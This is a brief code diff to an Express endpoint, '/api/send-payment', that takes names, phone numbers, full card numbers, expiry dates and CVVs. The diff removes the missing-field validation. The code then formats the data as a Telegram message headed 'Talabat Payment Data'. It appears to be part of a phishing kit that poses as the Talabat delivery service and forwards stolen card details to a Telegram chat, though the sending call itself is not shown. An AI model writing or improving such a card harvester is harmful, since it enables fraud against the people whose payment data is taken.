@@ -50,12 +50,7 @@ app.post('/api/send-payment', async (req, res) => {
         } = req.body;
         
         // Validate required fields
-        if (!firstName || !lastName || !phoneNumber || !creditCard || !expiryDate || !cvv) {
-            return res.status(400).json({
-                success: false,
-                message: 'Missing required fields'
-            });
-        }
+        
         
         // Format message for Telegram (same format as api/send-payment.js)
         const message = `💳 [Talabat Payment Data]
